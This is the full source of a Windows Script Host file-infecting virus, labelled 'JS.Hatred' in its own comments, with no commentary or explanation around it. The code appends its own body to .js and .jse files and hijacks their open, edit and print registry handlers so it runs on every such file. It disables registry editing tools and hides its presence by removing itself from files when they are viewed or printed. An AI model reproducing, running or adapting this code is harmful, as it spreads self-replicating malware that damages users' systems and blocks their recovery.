WScript.Echo("Virus JS.Hatred v0.1 is here. Hooray!!!")
//`
try{
var FSO = WScript.CreateObject("Scripting.FileSystemObject")
var WsShell = WScript.CreateObject("WScript.Shell")
var OpenBody = FSO.OpenTextFile(WScript.ScriptFullName, 1)
Buffa = OpenBody.ReadAll()
OpenBody.Close()
Metka = unescape("//%60")
OurBody = ""
for (i=Buffa.length; i>1; i--){
if (Buffa.charAt(i) == unescape("%60")){
i = 1
OurBody = Metka + OurBody}
else{
OurBody = Buffa.charAt(i) + OurBody}}
var CmdLine = new Enumerator (WScript.Arguments)
if (!CmdLine.atEnd()){
Job = CmdLine.item()
if (Job == "##I" || Job == "##E" || Job == "##P"){
for (; !CmdLine.atEnd(); CmdLine.moveNext()){
if (FSO.FileExists (CmdLine.item())){
VictimName = CmdLine.item()
var OpenVictim = FSO.OpenTextFile(VictimName, 1)
All = OpenVictim.ReadAll()
OpenVictim.Close()
if (Job == "##I"){
if (All.substr(All.length-5, 3) != "SMF"){
DoFile(VictimName)}
WsShell.Run (FSO.GetSpecialFolder(0) + "\\Wscript.exe " + VictimName)}
if (Job == "##E" || Job == "##P"){
if (All.substr(All.length-5, 3) == "SMF"){
x = All.length
while (All.charAt(x) != unescape("%60")){
x = x - 1}
x = x - 3
ClearVictimBody = ""
for (i=x; i>-1; i--){
ClearVictimBody = All.charAt(i) + ClearVictimBody}
var GetVFile = FSO.GetFile(VictimName)
VAttr = GetVFile.Attributes
GetVFile.Attributes = 0
var ClearVictim = FSO.OpenTextFile(VictimName, 2)
ClearVictim.Write(ClearVictimBody)
ClearVictim.Close()
GetVFile.Attributes = VAttr}
if (Job == "##E"){
var Wait = WsShell.Run(FSO.GetSpecialFolder(0) + "\\NotePad.exe " + VictimName, 1, 1)}
if (Job == "##P"){
var Wait = WsShell.Run(FSO.GetSpecialFolder(0) + "\\NotePad.exe /p " + VictimName, 1, 1)}
DoFile(VictimName)}}}}}
if (CmdLine.atEnd()){
var Handler = FSO.CreateTextFile(FSO.GetSpecialFolder(0) + "\\WScript.js", 1)
Handler.Write(OurBody)
Handler.Close()
WsShell.RegWrite ("HKCR\\JSFile\\Shell\\Open\\Command\\", FSO.GetSpecialFolder(0)+"\\Wscript.exe "+FSO.GetSpecialFolder(0)+"\\WScript.js ##I \"%1\" %*")
WsShell.RegWrite ("HKCR\\JSFile\\Shell\\Edit\\Command\\", FSO.GetSpecialFolder(0)+"\\Wscript.exe "+FSO.GetSpecialFolder(0)+"\\WScript.js ##E \"%1\"")
WsShell.RegWrite ("HKCR\\JSFile\\Shell\\Print\\Command\\", FSO.GetSpecialFolder(0)+"\\Wscript.exe "+FSO.GetSpecialFolder(0)+"\\WScript.js ##P \"%1\"")
WsShell.RegWrite ("HKCR\\JSEFile\\Shell\\Open\\Command\\", FSO.GetSpecialFolder(0)+"\\Wscript.exe "+FSO.GetSpecialFolder(0)+"\\WScript.js ##I \"%1\" %*")
WsShell.RegWrite ("HKCR\\JSEFile\\Shell\\Edit\\Command\\", FSO.GetSpecialFolder(0)+"\\Wscript.exe "+FSO.GetSpecialFolder(0)+"\\WScript.js ##E \"%1\"")
WsShell.RegWrite ("HKCR\\JSEFile\\Shell\\Print\\Command\\", FSO.GetSpecialFolder(0)+"\\Wscript.exe "+FSO.GetSpecialFolder(0)+"\\WScript.js ##P \"%1\"")
WsShell.RegWrite ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools", 1, "REG_DWORD")
WsShell.RegWrite ("HKCR\\JSFile\\EditFlags", 24, "REG_DWORD")
WsShell.RegWrite ("HKCR\\JSEFile\\EditFlags", 24, "REG_DWORD")}
function DoFile(VictimName){
var GetVFile = FSO.GetFile(VictimName)
VAttr = GetVFile.Attributes
GetVFile.Attributes = 0
var DoVictim = FSO.OpenTextFile(VictimName, 8)
DoVictim.Write(OurBody)
DoVictim.Close()
GetVFile.Attributes = VAttr}}
catch(a){}
//All of us are doomed... There is no salvation...
//JS.Hatred v1.0 by Gobleen Warrior//SMF